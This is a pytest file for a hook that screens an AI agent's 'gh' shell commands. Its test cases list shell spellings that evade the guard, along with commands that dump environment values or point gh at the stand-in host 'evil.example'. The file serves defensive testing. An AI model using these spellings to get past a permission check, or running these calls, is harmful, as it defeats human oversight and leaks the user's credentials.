"""Round-3 additions on clauDNA #369: spellings the round-2 guard still read differently from the shell —
quote/backslash-split flag names, scp-style hosts, trailing comments, backtick substitution, a GH_HOST=
prefix. Each case is red on 03cb905 and green with the decider + pre-filter changes. Fake values only."""

from __future__ import annotations

import importlib.util
import io
import json
import subprocess
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location(
    "gh_guard_decide", _ROOT / "plugin-hooks" / "gh-guard-decide.py"
)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)
HOOK = _ROOT / "plugin-hooks" / "pretooluse-permissions.sh"

G = "gh pr list --json number --jq env.X"
GR = "gh pr list -R evil.example/o/r --search x"


def verdict(cmd: str) -> str:
    return mod.decide(cmd)[0]


@pytest.mark.parametrize("raw", [b"gh pr list --json number --jq env.X # \xc3\xa9", b"gh pr list --json number --jq env.X # \xff"])
def test_the_decider_decodes_stdin_the_way_it_decodes_argv(monkeypatch, raw):
    """A text-mode stdin is strict in the locale's encoding: one byte it cannot decode raises, the hook
    reads that as "did not answer" and fails open. argv used surrogateescape, so stdin must too."""
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(raw), encoding="ascii"))
    assert mod.main(["gh-guard-decide.py"]) == 10


@pytest.mark.parametrize(
    "cmd",
    [
        f"echo ok # note\n{G}",  # a trailing comment must not join the next line onto this one
        f"echo ok # note\n{GR}",
        f"# note\n{G}",
        f"echo `{G}`",  # backtick command substitution
        f"x=`{GR}`",
        f"# <<EOF\n{G}",  # a heredoc marker in a comment is not a heredoc
        f"echo ok # <<EOF\n{G}",
        f"echo \\<<EOF\n{G}",  # nor after a backslash
        f'echo "first\nsee <<EOF here\nend"\n{G}',  # nor inside a multi-line quoted string
        f"echo 'first\nsee <<EOF here\nend'\n{G}",
        f"echo $((a << b))\n{G}",  # nor an arithmetic shift
        f"echo $((a << b))\n{G}\nb",
        "gh pr list -R git@evil.example:o/r.git --search x",  # scp-style host
        "gh pr list --repo=git@evil.example:o/r",
        "gh pr list -Rgit@evil.example:o/r",
        "gh repo view git@evil.example:o/r",
        "GH_HOST=evil.example gh pr list -R o/r --search x",  # a GH_HOST prefix names the host
        "env GH_HOST=evil.example gh pr list -R o/r --search x",
        "GH_HOST=evil.example.com gh pr list",  # the host alone, with no -R beside it
        "env GH_HOST=evil.example.com gh pr list",
        "GH_REPO=evil.example.com/o/r gh pr list",  # GH_REPO is [HOST/]OWNER/REPO: the same reach as -R
        "env GH_REPO=evil.example.com/o/r gh pr view 1",
        "GH_HOST+=evil.example.com gh pr list",  # += puts the value in the environment too
        "GH_REPO+=evil.example.com/o/r gh pr list",
        "A+=1 gh pr list --json number --jq env.X",  # a += prefix on any name must not hide the call
        "A[0]=1 gh pr list --json number --jq env.X",  # bash runs a subscripted prefix too
        "A[0]+=1 gh pr list --json number --jq env.X",
        f">/dev/null {G}",  # the shell opens a redirection before the command word, then runs the call
        f"2>&1 {G}",
        f"</dev/null {G}",
        f"A=1 2>/dev/null {G}",
        f"&>/dev/null {G}",
        f"{{fd}}>/dev/null {G}",
        f">/dev/null {GR}",
        f"echo don't `{G}`",  # quoting the tokenizer cannot follow: the lenient split still sees the backtick call
    ],
)
def test_spellings_the_shell_reads_differently_are_denied(cmd):
    assert verdict(cmd) == "deny", cmd


@pytest.mark.parametrize(
    "cmd",
    [
        f"# {G}",  # a comment that only mentions the shape runs nothing
        "gh pr list -R git@github.com:o/r.git --json number",
        "GH_HOST=github.com gh pr list -R o/r --json number",
        "GH_REPO=o/r gh pr list",
        "GH_REPO=github.com/o/r gh pr list",
        "A+=1 gh pr list --json number --jq .[].number",
        "2>&1 gh pr list --json number --jq .[].number",
        ">/dev/null gh pr list --json number",
        "gh pr list --json number >/dev/null 2>&1",
        "gh pr list --json title --jq '.[] | select(.title | test(\"#12\")) | .title'",  # a hash inside a string
        "gh pr comment 5 -R o/r --body-file - <<'EOF'\nuse --jq env.X and -R evil.example/o/r here\nEOF",
    ],
)
def test_ordinary_calls_stay_allowed(cmd):
    assert verdict(cmd) == "allow", cmd


def _hook(tmp_path: Path, cmd: str, allow: list[str]) -> str:
    (tmp_path / ".claude").mkdir(exist_ok=True)
    (tmp_path / ".claude" / "settings.json").write_text(
        json.dumps({"permissions": {"allow": allow}})
    )
    p = subprocess.run(
        ["bash", str(HOOK)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}),
        capture_output=True,
        text=True,
        cwd=tmp_path,
        env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
        timeout=20,
    )
    return (
        "deny"
        if '"permissionDecision":"deny"' in p.stdout
        else "allow"
        if '"permissionDecision":"allow"' in p.stdout
        else "prompt"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        'gh pr list --json number --j"q" env.X',  # a long flag split by quotes
        'gh pr list --json number "-q" env.X',
        'gh pr list --json number -"q" env.X',
        "gh pr list --json number --j\\q env.X",  # a flag with a backslash in it
        "gh pr list --json number -\\q env.X",
        'gh pr list "-R" evil.example/o/r --search x',
        'gh pr list -"R" evil.example/o/r --search x',
        'gh pr list --re"po" evil.example/o/r',
        'gh api --host"name" evil.example repos/o/r',
        "gh pr list -R git@evil.example:o/r.git --search x",
        "echo ok # note\ngh pr list --json number --jq env.X",
    ],
)
def test_the_hook_prefilter_reads_a_flag_the_way_the_shell_spells_it(tmp_path, cmd):
    allow = ["Bash(gh pr list *)", "Bash(gh api *)", "Bash(echo *)"]
    assert _hook(tmp_path, cmd, allow) == "deny", repr(cmd)


@pytest.mark.parametrize(
    "cmd,grant",
    [
        ("gh api --hostname evil.example repos/o/r", "Bash(gh api *)"),  # the plain spelling, through the hook
        ("gh repo view git@evil.example:o/r", "Bash(gh repo view *)"),  # a positional scp-style host has no flag to trigger on
    ],
)
def test_the_hook_forwards_a_host_with_no_other_trigger(tmp_path, cmd, grant):
    assert _hook(tmp_path, cmd, [grant]) == "deny", repr(cmd)


def test_a_quote_split_command_word_is_still_gh_under_a_bare_bash_grant(tmp_path):
    assert _hook(tmp_path, 'g"h" pr list --json number --jq env.X', ["Bash"]) == "deny"
